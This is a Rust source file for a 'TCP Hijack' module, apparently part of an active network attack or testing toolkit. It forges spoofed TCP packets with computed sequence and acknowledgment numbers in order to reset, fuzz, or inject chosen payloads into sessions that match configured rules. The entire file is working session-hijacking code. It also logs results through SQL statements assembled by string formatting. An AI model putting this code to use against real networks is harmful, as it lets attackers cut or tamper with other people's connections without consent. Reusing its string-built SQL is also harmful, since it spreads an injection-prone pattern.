#![allow(non_upper_case_globals)]
extern crate log;
extern crate rand;
extern crate regex;
extern crate etherparse;
extern crate lazy_static;
use lazy_static::lazy_static;

use crate::utils;
use regex::Regex;
use std::sync::{mpsc, Mutex};
use etherparse::PacketBuilder;
use crate::config::tcp_rule::TcpRule;

#[allow(unused_imports)]
use log::{trace, debug, info, warn, error};

lazy_static! {
    static ref time_unix: u64           = utils::get_unix_time();
    static ref time_formatted: String   = utils::get_formatted_time();
    static ref module_type: u8          = utils::consts::MODULE_TYPE_ACTIVE;
    static ref module_name:&'static str = "TCP Hijack";
    static ref module_info:&'static str = "Reset, fuzz or hijack tcp session";
    static ref risk_type: u8            = utils::consts::RISK_TYPE_OTHER;
    static ref risk_level: u8           = utils::consts::RISK_LEVEL_LOG;
    static ref src: Mutex<String>       = Mutex::new(String::new());
}

pub fn get_packet(pkt: &[u8], rules: &TcpRule, db_tx: mpsc::Sender<String>) -> Option<Vec<u8>> {

    // I was going to use SlicedPacket here, for faster speed...
    // However, XXX_HeaderSlice.source() or any other functions return &[u8],
    // and PacketBuilder only accepts array with fixed length, like [u8; 8].
    // So, we stick to PacketHeaders here...

/*    let builder = match pkt.link {
        Some(etherparse::LinkSlice::Ethernet2(header)) => {
            let dst_mac = header.source();
            let src_mac = header.destination();
            let dst: [u8;6] = [0;6];
            let src: [u8;6] = [0;6];
            dst.copy_from_slice(dst_mac);
            src.copy_from_slice(src_mac);
            PacketBuilder::ethernet2(src, dst)
        }
    };
*/  
    
    let pkt = etherparse::PacketHeaders::from_ethernet_slice(pkt).unwrap();
    *src.lock().unwrap() = utils::src_dst_proto_from_IpHeader(&pkt.ip).0;

    // handle transport layer first, returns if not in the filter

    let dst_mac = pkt.link.as_ref().unwrap().source;
    let src_mac = pkt.link.as_ref().unwrap().destination;
    let transport = pkt.transport.unwrap().tcp().unwrap();
    if transport.rst || transport.fin { return None; }

    let mut log_line = String::new();
  
    let (builder, ip_payload_len, action) = match pkt.ip.as_ref().unwrap() {
        etherparse::IpHeader::Version4(header) => {
            match rules.get_Action(&header.source, transport.source_port, &header.destination, transport.destination_port) {
                Some(action) => {
                    log_line = format!("TCP Hijack: {}.{}.{}.{}:{} => {}.{}.{}.{}:{},  ",
                        header.source[0],header.source[1],header.source[2],header.source[3], transport.source_port, 
                        header.destination[0],header.destination[1],header.destination[2],header.destination[3],
                        transport.destination_port);
                    (
                        PacketBuilder::ethernet2(src_mac, dst_mac).ipv4(header.destination, header.source, 64), 
                        header.payload_len, 
                        action
                     )},
                None => return None
            }
        },

        etherparse::IpHeader::Version6(header) =>{
            // TODO IPv6 addr match, we may use u128 in TcpRule.
            match rules.get_Action6(&header.source, transport.source_port, &header.destination, transport.destination_port) {
                Some(action) => {
                (
                    PacketBuilder::ethernet2(src_mac, dst_mac).ipv6(header.destination, header.source, 64),
                    header.payload_length,     //include the length of extension headers
                    action
                )},
                None => return None
            }
        }
    };


    let dst_port = transport.source_port;
    let src_port = transport.destination_port;
    let seq = transport.acknowledgment_number;
    let mut ack = transport.sequence_number
                + ip_payload_len as u32 
                - transport.header_len() as u32; // minus the TCP header length, options length included

    if transport.syn{
        if action.reset{
            ack += 1;       // the handshake, transport.acknowledgment_number == 0
        }
        else {
            log_line = format!("{}action: [none]", log_line);
            debug!("{}", log_line);
            db_tx.send(format!("insert into t_result values(null, '{}', '{}', '{}', {}, '{}', '{}', {}, {}, '{}', 0 )", 
                                *time_unix, *time_formatted, *src.lock().unwrap(), *module_type, *module_name,
                                *module_info, *risk_type, *risk_level, log_line )).unwrap();
            return None;    // too early for TCP inject
        }
    }

    let (builder, payload) = match &action.inject {
        None if action.reset => {
            // reset
            log_line = format!("{}action: [reset]", log_line);
            let window = 0;
            let payload = b"TCP Reset -- Cylons".to_vec();
            (
                builder
                .tcp(src_port, dst_port, seq, window)
                .ack(ack)
                .rst(),
                payload
            )
        },
        None if action.fuzz => {
            // fuzz
            let window = 1024;   // ??
            let mut payload = vec![0u8; rand::random::<usize>() % 1024];
            log_line = format!("{}action: [fuzz], random data size: {}", log_line, payload.len());
            for i in &mut payload {
                *i = rand::random::<u8>();
            }

            (
                builder
                .tcp(src_port, dst_port, seq, window)
                .ack(ack),
                payload
            )

        },
        Some((payload_pattern, payload_response)) if !action.reset && match_payload_pattern(pkt.payload, payload_pattern)=> {
            // inject or fuzz
            let payload = if action.fuzz {                    // if action.fuzz, we response random data instead of user specified data
                let mut payload_random = vec![0u8; rand::random::<usize>() % 1024];
                log_line = format!("{}action: [fuzz on packet pattern], random data size: {}", log_line, payload_random.len());
                for i in &mut payload_random {
                    *i = rand::random::<u8>();
                }
                payload_random
            }
            else {
                log_line = format!("{}action: [inject]", log_line);
                payload_response.to_owned()
            };

            let window = 1024;   // ??
            (
                builder
                .tcp(src_port, dst_port, seq, window)
                .ack(ack),
                payload
            )
        },
        _ => {
            log_line = format!("{}action: [none]", log_line);
            debug!("{}", log_line);
            db_tx.send(format!("insert into t_result values(null, '{}', '{}', '{}', {}, '{}', '{}', {}, {}, '{}', 0 )", 
                                *time_unix, *time_formatted, *src.lock().unwrap(), *module_type, *module_name,
                                *module_info, *risk_type, *risk_level, log_line )).unwrap();
            return None;
        }
    };

    debug!("{}", log_line);
    db_tx.send(format!("insert into t_result values(null, '{}', '{}', '{}', {}, '{}', '{}', {}, {}, '{}', 0 )", 
                        *time_unix, *time_formatted, *src.lock().unwrap(), *module_type, *module_name,
                        *module_info, *risk_type, *risk_level, log_line )).unwrap();

 
    //get some memory to store the result
    let mut result = Vec::<u8>::with_capacity(
                        builder.size(0));
    //serialize
    builder.write(&mut result, &payload).unwrap();
    Some(result)
    
}

pub fn match_payload_pattern(packet: &[u8], pattern: &str) -> bool {
    // packet to hex string '\x01\x02\x03'
    let packet_hex_str = packet.iter().map(|i|format!("{:02x}", i)).collect::<String>();
    Regex::new(pattern).unwrap().is_match(&packet_hex_str)
}
